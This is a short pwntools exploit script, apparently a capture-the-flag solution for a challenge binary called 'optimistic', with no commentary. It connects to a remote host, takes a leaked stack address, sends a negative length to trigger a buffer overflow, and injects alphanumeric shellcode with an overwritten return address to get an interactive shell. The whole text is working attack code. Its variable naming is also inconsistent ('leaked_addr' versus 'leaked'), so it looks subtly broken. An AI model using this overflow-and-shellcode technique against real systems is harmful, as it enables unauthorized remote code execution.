from pwn import *

#p = process('./optimistic')
p = remote('167.99.95.121', 30944)

p.sendlineafter(b': ', b'y')
leaked_addr = p.recvline().strip(b"Great! Here's a small welcome gift: ")
shellcode_addr = int(leaked, 16)

p.sendlineafter(b'Email: ', b'test')
p.sendlineafter(b'Age: ', b'test')
p.sendlineafter(b'name: ', b'-1')

shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
shellcode += b'A' * (104-len(shellcode))
shellcode += p64(shellcode_addr - 96)

p.sendlineafter(b'Name: ', shellcode)

p.interactive()
